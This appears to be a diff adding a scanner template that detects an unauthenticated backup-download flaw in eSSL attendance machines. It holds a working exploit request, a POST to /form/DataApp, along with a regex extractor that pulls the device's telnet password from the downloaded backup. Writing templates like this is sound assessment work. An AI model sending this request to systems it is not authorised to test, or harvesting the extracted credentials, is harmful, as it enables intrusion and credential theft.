@@ -1,0 +1,39 @@
+id: essl-dataapp-unauth-database-download
+info:
+  name: eSSL DataApp Unauthenticated Database Download
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The eSSL attendance machine allows unauthenticated users to download backup files, which attackers can use to further compromise the system, such as accessing the telnet password.
+  reference:
+    - https://nosec.org/home/detail/3032.html
+  tags: download
+
+http:
+  - raw:
+      - |
+        POST /form/DataApp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        style=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Content-Disposition:"
+          - "filename=device"
+      - type: word
+        part: body
+        words:
+          - "ZK format"
+    extractors:
+      - type: regex
+        name: telnet_password
+        part: body
+        regex:
+          - "\\$Telnet=(.*?)\\r?\\n"
